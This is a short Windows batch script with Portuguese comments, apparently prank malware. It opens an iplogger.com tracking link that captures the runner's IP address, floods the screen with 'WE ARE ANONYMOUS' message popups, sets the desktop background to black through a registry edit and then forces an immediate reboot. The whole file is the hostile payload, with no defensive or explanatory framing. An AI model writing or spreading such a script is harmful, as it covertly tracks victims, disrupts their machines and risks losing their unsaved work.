@echo off

:: Abre o navegador com o link
start "" "https://iplogger.com/2Tfd65"

:: Contador
set "contador=0"

:loop
start /min cmd /c "msg * WE ARE ANONYMOUS"

:: Aumenta o contador
set /a "contador+=1"

:: Verifica se o contador atingiu 30
if %contador%==30 (
    reg add "HKEY_CURRENT_USER\Control Panel\Colors" /v Background /t REG_SZ /d "0 0 0" /f
    shutdown /r /t 0
    exit
)

goto loop
